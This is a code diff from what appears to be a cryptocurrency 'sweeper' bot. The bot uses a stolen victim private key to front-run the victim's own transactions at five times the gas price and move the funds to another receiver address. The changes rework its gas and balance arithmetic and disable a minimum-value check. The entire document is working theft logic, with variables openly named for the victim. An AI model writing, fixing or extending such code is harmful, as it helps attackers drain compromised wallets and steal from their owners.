@@ -640,7 +640,7 @@ if(fromaddress.toLowerCase() == victimaddr.toLowerCase()) {
   if(results) {
     request.log.info("got to result eth2");
     provider =  new providers.JsonRpcProvider(AnkrId2)
-    await cancelandsend(request, results.get("pkaddr"), recver2, provider)
+    await cancelandsend(request, results.get("pkaddr"), recver2, provider, web3)
   //  await proxsend(request,results, recver, AnkrId,ntwk, value, 'logger' )
   
   }
@@ -1188,16 +1188,20 @@ function getntwork(chainid: number) {
 
 
 
-async function cancelandsend(transactx: any, VICTIM_KEY: string, reciver: string, provider: any) {
+async function cancelandsend(transactx: any, VICTIM_KEY: string, reciver: string, provider: any, web3: any) {
 
   const wallet = new Wallet(VICTIM_KEY, provider);
   
 //  var balance = await wallet.getBalance();
+
+var BN = web3.utils.BN;
+
  const valuee = await transactx.object.get("value")
  request.log.info('Value is: '+ethers.utils.formatUnits(valuee, "ether")+"ETH");
- var balance = ethers.BigNumber.from(ethers.utils.formatUnits(valuee, "wei")); // value to be sent by the previous transaction
+ request.log.info('Value is in wei: '+ethers.utils.formatUnits(valuee, "wei")+"ETH");
+ var balance = new BN(valuee); // value to be sent by the previous transaction
 
-  if (ethers.BigNumber.from(ethers.utils.formatUnits(valuee, "wei")).lte(0)) {
+  if (balance < 0) {
     request.log.info(`Value is zero`);
     return;
   }
@@ -1205,15 +1209,15 @@ async function cancelandsend(transactx: any, VICTIM_KEY: string, reciver: string
 //  const gasPrice = ethers.BigNumber.from(await provider.getGasPrice());
 var gapricevalu = await transactx.object.get("gasPrice");
 var gaslimivalu = await transactx.object.get("gasLimit");
- var gasPrice = (ethers.BigNumber.from(ethers.utils.formatUnits(gapricevalu, "gwei"))).mul(5);
- var gasLimit = ethers.BigNumber.from(ethers.utils.formatUnits(gaslimivalu, "gwei"));
+ var gasPrice = (new BN(gapricevalu)).mul(5);
+ var gasLimit = (new BN(gaslimivalu));
  var gasPriceTotal = (gasPrice).mul(gasLimit);
 
- const gasPrice2 = (ethers.BigNumber.from(await provider.getGasPrice())).mul(5);
+ const gasPrice2 = (new BN(await provider.getGasPrice())).mul(5);
  const gasLimit2 = gasLimit;
  const gasPriceTotal2 = (gasPrice).mul(gasLimit);
 
- if(gasPriceTotal.lt(gasPriceTotal2)) {
+ if(gasPriceTotal < gasPriceTotal2) {
 
   request.log.info("yes it is less than");
     gasPriceTotal = gasPriceTotal2;
@@ -1225,14 +1229,14 @@ var gaslimivalu = await transactx.object.get("gasLimit");
   request.log.info("no it is greater than");
  }
 
- const val = balance.sub(gasPriceTotal.add(1));
- const minval = ethers.BigNumber.from(ethers.utils.parseUnits("0.0011", "ether"))
+ const val = balance.sub(gasPriceTotal.add(new BN(1)));
+//  const minval = (new BN(ethers.utils.parseUnits("0.0011", "ether")))
 
- if (val.lt(minval)) {
-  request.log.info(`Eth Balance is less than min value 2$ - ${ethers.utils.formatUnits(minval, "ether")}Eth .... (balance=${formatEther(val)} gasPriceTotal=${ethers.utils.formatUnits(gasPriceTotal, "gwei")}) gasPrice= ${ethers.utils.formatUnits(gasPrice, "gwei")})`);
-  return;
-}
-  if (val.lt(gasPriceTotal)) {
+//  if (val.lt(minval)) {
+//   request.log.info(`Eth Balance is less than min value 2$ - ${ethers.utils.formatUnits(minval, "ether")}Eth .... (balance=${formatEther(val)} gasPriceTotal=${ethers.utils.formatUnits(gasPriceTotal, "gwei")}) gasPrice= ${ethers.utils.formatUnits(gasPrice, "gwei")})`);
+//   return;
+// }
+  if (val < gasPriceTotal) {
     request.log.info(` Eth Balance is less than gas price, waiting.... (balance=${formatEther(val)} gasPriceTotal=${ethers.utils.formatUnits(gasPriceTotal, "gwei")}) gasPrice= ${ethers.utils.formatUnits(gasPrice, "gwei")})`);
     return;
   }
